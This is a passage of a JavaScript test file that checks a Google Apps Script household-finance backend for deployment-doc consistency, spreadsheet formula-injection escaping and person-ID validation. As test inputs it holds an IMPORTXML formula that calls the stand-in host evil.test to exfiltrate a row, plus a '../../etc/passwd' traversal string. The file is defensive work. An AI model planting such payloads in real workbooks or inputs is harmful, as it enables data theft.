    assert.equal(/Execute as:\s*\*\*Me\*\*/.test(read('docs/SETUP.md')), true,
      'SETUP.md no longer says to execute as Me');
  });

  test('and the architecture document does not claim the opposite', () => {
    const architecture = read('docs/ARCHITECTURE.md');
    const claim = /deployed as "execute as user accessing"/.test(architecture);
    assert.equal(claim, false, 'ARCHITECTURE.md claims a model the setup page contradicts');
  });

  test('nor does the backend itself, which is where it survived', () => {
    /*
     * This check used to name one document, because that is where the wrong
     * claim was found. It lived in two places.
     *
     * `apps-script/Code.gs` opened by saying the web app is deployed as
     * "execute as the user accessing", "so every read and write happens under
     * the signed-in family member's own Google account" — the same sentence
     * `docs/SECURITY.md` records as the corrected error, still standing in the
     * file a household pastes into script.google.com, one directory from the
     * test written to stop it.
     *
     * It matters more there than it did in the document. Under "execute as
     * me" every request runs with the *owner's* Sheets and Drive authority,
     * whoever sent it; Google separates nobody. The wrong version reads as
     * though Google were doing the separating, which makes `verifyToken` look
     * like a second line of defence rather than the only one.
     *
     * Every `.gs` file, not just the one that was wrong: the point of a
     * derived check is that it covers the file nobody has written yet.
     */
    const scripts = readdirSync(join(ROOT, 'apps-script')).filter((f) => f.endsWith('.gs'));
    assert.ok(scripts.length > 0, 'the directory is empty, which cannot be right');

    const wrong = scripts.filter((f) => /user accessing/i.test(read(`apps-script/${f}`)));
    assert.deep(wrong, [],
      `describes the deployment as "user accessing": ${wrong.join(', ')}`);
  });

  test('sending a one-time code needs the scope that sends mail', () => {
    // `MailApp.sendEmail` fails at run time without it, and the failure would
    // be a household staring at a code that never arrives.
    const manifest = JSON.parse(read('apps-script/appsscript.json'));
    assert.equal(manifest.oauthScopes.includes(
      'https://www.googleapis.com/auth/script.send_mail'), true);
  });
});

/* ------------------------------------------------ what reaches a cell */

describe('a formula cannot reach the workbook', () => {
  /*
   * The threat `Sheets.gs` names in its own comment: a value beginning `=`,
   * `+`, `-` or `@` is a formula, and `=IMPORTXML("http://evil.test","//x")`
   * in a cell exfiltrates the row the moment anybody opens the workbook.
   *
   * `tests/security.test.mjs` covers `escapeForSheet`, which is exported,
   * correct, and **called by nothing** — the repository's own sentence
   * applies: a test of a function nothing calls proves the function works and
   * says nothing about the application. These go through the deployed `.gs`.
   */
  const sheets = () => loadAppsScript(['Sheets.gs'], {}, ['recordToRow', 'rowToRecord']);

  test('a scalar cell is defused', () => {
    const [payee] = sheets().recordToRow(['payee'],
      { payee: '=IMPORTXML("http://evil.test","//x")' });
    assert.equal(payee, '\'=IMPORTXML("http://evil.test","//x")');
  });

  test('and so is a list, which was reaching Sheets as a formula', () => {
    // Measured before the fix: `tags` joined to
    // `=IMPORTXML("http://evil.test","//x"), groceries` — the scalar beside
    // it escaped and this one not. Sheets reads the cell, so what matters is
    // the first character of the joined string, not that it began as a list.
    const [tags] = sheets().recordToRow(['tags'],
      { tags: ['=IMPORTXML("http://evil.test","//x")', 'groceries'] });
    assert.not(/^[=+\-@\t\r]/.test(tags), `a list cell reached Sheets as a formula: ${tags}`);
    assert.equal(tags, '\'=IMPORTXML("http://evil.test","//x"), groceries');
  });

  test('every leading character Sheets treats as a formula', () => {
    const { recordToRow } = sheets();
    for (const lead of ['=', '+', '-', '@']) {
      const [cell] = recordToRow(['tags'], { tags: [`${lead}payload`] });
      assert.equal(cell, `'${lead}payload`, `a list starting ${lead} was not defused`);
    }
  });

  test('an ordinary value is not touched', () => {
    // The other direction: a defence that escapes everything corrupts every
    // name in the workbook.
    const { recordToRow } = sheets();
    assert.equal(recordToRow(['payee'], { payee: 'Reliance Fresh' })[0], 'Reliance Fresh');
    assert.deep(recordToRow(['tags'], { tags: ['food', 'delivery'] }), ['food, delivery']);
  });

  test('and the escape comes back off on the way in', () => {
    // Never silently lose data: what the household typed is what they get.
    const { recordToRow, rowToRecord } = sheets();
    const headers = ['payee', 'tags'];
    const row = recordToRow(headers, { payee: '-500 adjustment', tags: ['@mention'] });
    const back = rowToRecord(headers, row);
    assert.equal(back.payee, '-500 adjustment');
    assert.equal(back.tags, '@mention');
  });

  test('a stringified object needs no escaping and gets none', () => {
    // `JSON.stringify` always yields `{`, `[`, a quote or a digit, none of
    // which Sheets reads as a formula. Left alone deliberately, so this
    // records the reasoning rather than leaving it to look like an omission.
    const [cell] = sheets().recordToRow(['meta'], { meta: { a: '=BAD()' } });
    assert.equal(cell, '{"a":"=BAD()"}');
    assert.not(/^[=+\-@]/.test(cell));
  });
});


describe('the id that decides whose records a caller may reach', () => {
  /*
   * `cleanPersonId` was named nowhere in tests. Its own comment says it is
   * shared by both writers "because two copies of a validation rule is two
   * places for it to drift — and this one decides whose records a caller may
   * reach". A rule with that job and no test is a rule nobody would notice
   * losing.
   */
  const clean = () => loadAppsScript(
    ['Code.gs'],
    { PropertiesService: { getUserProperties: () => ({ getProperty: () => null }) } },
    ['cleanPersonId'],
  ).cleanPersonId;

  test('an ordinary record id survives', () => {
    assert.equal(clean()('per_owner'), 'per_owner');
    assert.equal(clean()('p-1'), 'p-1');
    assert.equal(clean()('  per_1  '), 'per_1');
  });

  test('and anything that is not one becomes empty, never partly kept', () => {
    // Empty is the safe value: `ownRecordAllows` refuses an empty personId,
    // so a rejected id grants nothing rather than granting something smaller.
    const c = clean();
    for (const bad of [
      '../../etc/passwd', 'per 1', 'per;1', "per'1", 'per\n1', '<script>',
      'per=1', 'per,1', '', null, undefined, 'a'.repeat(65),
    ]) {
      assert.equal(c(bad), '', JSON.stringify(bad));
    }
  });

  test('sixty-four characters is the edge, and it is inclusive', () => {
    // Pinned in both directions so the bound is a decision rather than a
    // number somebody can nudge without noticing.
    const c = clean();
    assert.equal(c('a'.repeat(64)).length, 64);
    assert.equal(c('a'.repeat(65)), '');
  });
});
